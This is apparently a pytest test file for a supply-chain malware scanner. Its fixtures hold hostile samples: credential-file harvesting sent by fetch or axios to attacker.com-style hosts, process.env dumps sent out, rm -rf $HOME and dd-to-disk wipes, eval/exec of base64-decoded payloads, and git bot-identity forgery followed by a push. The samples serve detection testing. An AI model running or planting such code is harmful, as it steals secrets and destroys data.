"""Tests for PayloadBehaviorScanner — credential harvest, destructive sinks,
decode-then-execute, exfil co-location, env scraping, and identity-forge detection."""

import asyncio
from pathlib import Path

import pytest

from depfence.core.models import Severity
from depfence.scanners.payload_behavior_scanner import PayloadBehaviorScanner


def _run(coro):
    return asyncio.run(coro)


@pytest.fixture
def scanner():
    return PayloadBehaviorScanner()


# ---------------------------------------------------------------------------
# Helper: write a source file and run _analyze directly (no filesystem walk)
# ---------------------------------------------------------------------------

def _analyze(scanner, content: str, rel: str = "scripts/payload.js") -> list:
    return scanner._analyze(content, rel)


def _write_file(project_dir: Path, rel: str, content: str) -> Path:
    path = project_dir / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)
    return path


# ---------------------------------------------------------------------------
# PB-01: Credential store breadth
# ---------------------------------------------------------------------------

class TestCredentialStoreBreadth:
    def test_mass_harvest_critical(self, scanner):
        """8+ credential stores in one file → CRITICAL."""
        content = """
        const aws = readFile('.aws/credentials');
        const kube = readFile('.kube/config');
        const docker = readFile('.docker/config.json');
        const npm = readFile('.npmrc');
        const gcloud = readFile('.config/gcloud');
        const ssh = readFile('.ssh/id_rsa');
        const netrc = readFile('.netrc');
        const gh = readFile('.config/gh/hosts.yml');
        const tf = readFile('.terraformrc');
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_multi_store_high(self, scanner):
        """5–7 credential stores → HIGH."""
        content = """
        const aws = readFile('.aws/credentials');
        const kube = readFile('.kube/config');
        const docker = readFile('.docker/config.json');
        const npm = readFile('.npmrc');
        const gcloud = readFile('.config/gcloud');
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.HIGH and "breadth" in f.title.lower()
                   for f in findings)

    def test_few_creds_no_breadth_finding(self, scanner):
        """Fewer than 5 credential stores → no breadth finding."""
        content = """
        const aws = readFile('.aws/credentials');
        const kube = readFile('.kube/config');
        """
        findings = _analyze(scanner, content)
        assert not any("breadth" in f.title.lower() for f in findings)

    def test_clean_file_no_findings(self, scanner):
        """Benign script → no findings."""
        content = """
        const express = require('express');
        const app = express();
        app.get('/', (req, res) => res.send('Hello World'));
        app.listen(3000);
        """
        findings = _analyze(scanner, content)
        assert len(findings) == 0


# ---------------------------------------------------------------------------
# PB-02: Destructive sinks
# ---------------------------------------------------------------------------

class TestDestructiveSinks:
    def test_rm_rf_home(self, scanner):
        """rm -rf ~ → CRITICAL."""
        findings = _analyze(scanner, "rm -rf ~")
        assert any(f.severity == Severity.CRITICAL and "destructive" in f.title.lower()
                   for f in findings)

    def test_rm_rf_home_env(self, scanner):
        """rm -rf $HOME → CRITICAL."""
        findings = _analyze(scanner, "rm -rf $HOME")
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_shutil_rmtree_home(self, scanner):
        """shutil.rmtree(os.path.expanduser(...)) → CRITICAL."""
        findings = _analyze(scanner,
                            "shutil.rmtree(os.path.expanduser('~/.config'))")
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_dd_zero_to_dev(self, scanner):
        """dd if=/dev/zero of=/dev/sda → CRITICAL."""
        findings = _analyze(scanner, "dd if=/dev/zero of=/dev/sda")
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_safe_rm_no_flag(self, scanner):
        """Plain rm without -rf flag → no destructive finding."""
        findings = _analyze(scanner, "rm somefile.txt")
        assert not any("destructive" in f.title.lower() for f in findings)


# ---------------------------------------------------------------------------
# PB-04: Decode-then-execute
# ---------------------------------------------------------------------------

class TestDecodeThenExecute:
    def test_eval_atob_js(self, scanner):
        """eval(atob(...)) → CRITICAL."""
        findings = _analyze(scanner, "eval(atob('cGF5bG9hZA=='))")
        assert any(f.severity == Severity.CRITICAL
                   and "decode" in f.title.lower() for f in findings)

    def test_exec_base64_python(self, scanner):
        """exec(base64.b64decode(...)) → CRITICAL."""
        findings = _analyze(scanner,
                            "exec(base64.b64decode('aW1wb3J0IG9z'))")
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_function_buffer_from(self, scanner):
        """Function(Buffer.from(...)) → CRITICAL."""
        findings = _analyze(scanner,
                            "Function(Buffer.from('payload', 'base64').toString())()")
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_child_process_decode_chain(self, scanner):
        """child_process exec with base64 decode chain → CRITICAL."""
        content = """
        const { exec } = require('child_process');
        exec(Buffer.from(encoded, 'base64').toString());
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL
                   and "child" in f.title.lower() for f in findings)

    def test_normal_buffer_usage_no_finding(self, scanner):
        """Buffer.from without eval/exec → no decode-then-exec finding."""
        content = "const buf = Buffer.from('hello world', 'utf8');"
        findings = _analyze(scanner, content)
        assert not any("decode" in f.title.lower() for f in findings)


# ---------------------------------------------------------------------------
# PB-05: Harvest + exfil co-location
# ---------------------------------------------------------------------------

class TestHarvestExfilColocation:
    def test_creds_plus_fetch(self, scanner):
        """4+ cred stores + fetch() in same file → CRITICAL."""
        content = """
        const aws = fs.readFileSync('.aws/credentials');
        const kube = fs.readFileSync('.kube/config');
        const docker = fs.readFileSync('.docker/config.json');
        const npmrc = fs.readFileSync('.npmrc');
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify({ aws, kube, docker, npmrc })
        });
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL
                   and "exfil" in f.title.lower() for f in findings)

    def test_creds_plus_axios(self, scanner):
        """4+ cred stores + axios → CRITICAL exfil finding."""
        content = """
        const a = fs.readFileSync('.aws/credentials', 'utf8');
        const b = fs.readFileSync('.kube/config', 'utf8');
        const c = fs.readFileSync('.docker/config.json', 'utf8');
        const d = fs.readFileSync('.ssh/id_rsa', 'utf8');
        axios.post('https://evil.example.com/drain', {a, b, c, d});
        """
        findings = _analyze(scanner, content)
        assert any("exfil" in f.title.lower() for f in findings)

    def test_few_creds_with_exfil_no_pb05(self, scanner):
        """Only 2 cred stores + fetch → PB-05 threshold not met."""
        content = """
        const aws = fs.readFileSync('.aws/credentials');
        const kube = fs.readFileSync('.kube/config');
        fetch('https://example.com/data', { method: 'POST' });
        """
        findings = _analyze(scanner, content)
        assert not any("harvest" in f.title.lower() and "exfil" in f.title.lower()
                       for f in findings)


# ---------------------------------------------------------------------------
# PB-06: Env-token mass scrape
# ---------------------------------------------------------------------------

class TestEnvTokenScrape:
    def test_json_stringify_process_env_plus_exfil(self, scanner):
        """JSON.stringify(process.env) + fetch → CRITICAL."""
        content = """
        const all = JSON.stringify(process.env);
        fetch('https://attacker.com/', { method: 'POST', body: all });
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL
                   and "mass-scrape" in f.title.lower() for f in findings)

    def test_object_entries_process_env_plus_exfil(self, scanner):
        """Object.entries(process.env) + requests.post → CRITICAL."""
        content = """
        const envData = Object.entries(process.env);
        axios.post('https://evil.com/leak', { data: envData });
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_for_in_os_environ_plus_exfil(self, scanner):
        """for x in os.environ + urllib → CRITICAL."""
        content = """
        import urllib.request
        data = {k: v for k, v in os.environ.items() if 'TOKEN' in k}
        for k in os.environ:
            urllib.request.urlopen('http://evil.com/?v=' + os.environ[k])
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_bulk_token_access_no_exfil(self, scanner):
        """5+ individual token env reads without exfil → HIGH."""
        content = """
        const a = process.env.GITHUB_TOKEN;
        const b = process.env.AWS_SECRET_KEY;
        const c = process.env.NPM_AUTH_TOKEN;
        const d = process.env.DOCKER_PASSWORD;
        const e = process.env.SLACK_BOT_TOKEN;
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.HIGH
                   and "bulk" in f.title.lower() for f in findings)

    def test_few_token_reads_no_finding(self, scanner):
        """Fewer than 5 individual token reads → no PB-06 finding."""
        content = """
        const token = process.env.GITHUB_TOKEN;
        const key = process.env.API_KEY;
        """
        findings = _analyze(scanner, content)
        assert not any("bulk" in f.title.lower() for f in findings)


# ---------------------------------------------------------------------------
# PB-07: Identity forge + push-to-many
# ---------------------------------------------------------------------------

class TestIdentityForge:
    def test_git_config_bot_identity_push(self, scanner):
        """git config user.email with noreply + git push → CRITICAL."""
        content = """
        git config user.email "github-actions@users.noreply.github.com"
        git config user.name "github-actions[bot]"
        git push origin main
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL
                   and "identity" in f.title.lower() for f in findings)

    def test_env_git_author_plus_push(self, scanner):
        """GIT_AUTHOR_EMAIL= shell export + simpleGit push → CRITICAL.

        The _IDENTITY_FORGE regex matches 'GIT_AUTHOR_EMAIL=' (no spaces around =).
        process.env.GIT_AUTHOR_EMAIL = '...' has spaces and does not match;
        use the shell export form that the regex is designed to catch.
        """
        content = """
        export GIT_AUTHOR_EMAIL=github-actions@users.noreply.github.com
        export GIT_COMMITTER_EMAIL=github-actions@users.noreply.github.com
        simpleGit().push('origin', 'main');
        """
        findings = _analyze(scanner, content)
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_no_bot_identity_no_finding(self, scanner):
        """git config with real email + push → no identity-forge finding."""
        content = """
        git config user.email "alice@example.com"
        git config user.name "Alice"
        git push origin main
        """
        findings = _analyze(scanner, content)
        assert not any("identity" in f.title.lower() for f in findings)

    def test_bot_identity_no_push_no_finding(self, scanner):
        """Bot identity set but no push → no PB-07 finding."""
        content = """
        git config user.email "github-actions@users.noreply.github.com"
        git config user.name "github-actions[bot]"
        # just local commits, no push
        """
        findings = _analyze(scanner, content)
        assert not any("identity" in f.title.lower() for f in findings)


# ---------------------------------------------------------------------------
# File collection tests
# ---------------------------------------------------------------------------

class TestFileCollection:
    def test_extensions_collected(self, scanner, tmp_path):
        """Only target extensions are collected."""
        for ext in (".js", ".ts", ".py", ".sh", ".mjs"):
            (tmp_path / f"file{ext}").write_text("console.log('hello')")
        (tmp_path / "file.txt").write_text("ignored")
        (tmp_path / "file.md").write_text("ignored")
        files = scanner._collect_files(tmp_path)
        exts = {f.suffix for f in files}
        assert ".txt" not in exts
        assert ".md" not in exts
        assert exts >= {".js", ".ts", ".py"}

    def test_skip_dirs_excluded(self, scanner, tmp_path):
        """node_modules, .git, venv, dist, build are excluded."""
        for skip_dir in ("node_modules", ".git", "venv", "dist", "build"):
            d = tmp_path / skip_dir
            d.mkdir()
            (d / "evil.js").write_text("fetch('http://attacker.com')")
        files = scanner._collect_files(tmp_path)
        for f in files:
            for skip_dir in ("node_modules", ".git", "venv", "dist", "build"):
                assert skip_dir not in f.parts

    def test_payload_dirs_walked(self, scanner, tmp_path):
        """Files in .github, scripts, .claude etc. are included."""
        (tmp_path / ".github").mkdir()
        (tmp_path / ".github" / "setup.js").write_text("// CI helper")
        files = scanner._collect_files(tmp_path)
        names = [str(f) for f in files]
        assert any(".github" in n for n in names)

    def test_empty_dir_returns_empty(self, scanner, tmp_path):
        """Empty project dir → no files collected."""
        files = scanner._collect_files(tmp_path)
        assert files == []


# ---------------------------------------------------------------------------
# scan_project integration
# ---------------------------------------------------------------------------

class TestScanProject:
    def test_scan_project_detects_payload(self, scanner, tmp_path):
        """scan_project finds a real payload file in the project tree."""
        _write_file(tmp_path, "scripts/harvest.js", """
        const a = fs.readFileSync('.aws/credentials');
        const b = fs.readFileSync('.kube/config');
        const c = fs.readFileSync('.docker/config.json');
        const d = fs.readFileSync('.npmrc');
        const e = fs.readFileSync('.config/gcloud/application_default_credentials.json');
        fetch('https://attacker.com/drain', { method: 'POST', body: JSON.stringify({a,b,c,d,e}) });
        """)
        findings = _run(scanner.scan_project(tmp_path))
        assert len(findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_scan_project_clean_returns_empty(self, scanner, tmp_path):
        """Clean project → no findings."""
        _write_file(tmp_path, "src/app.py", """
def main():
    print("Hello, world!")

if __name__ == "__main__":
    main()
""")
        findings = _run(scanner.scan_project(tmp_path))
        assert len(findings) == 0

    def test_analyze_referenced_payload_no_obfuscation_error(self, scanner, tmp_path):
        """analyze_referenced_payload works even without the obfuscation module."""
        p = _write_file(tmp_path, "hook.sh", "rm -rf $HOME")
        findings = scanner.analyze_referenced_payload(p, tmp_path)
        assert any(f.severity == Severity.CRITICAL for f in findings)


# ---------------------------------------------------------------------------
# Scanner metadata
# ---------------------------------------------------------------------------

def test_scanner_name_and_ecosystem(scanner):
    assert scanner.name == "payload_behavior"
    assert "multi" in scanner.ecosystems


def test_scan_stub_returns_empty(scanner):
    result = _run(scanner.scan([]))
    assert result == []
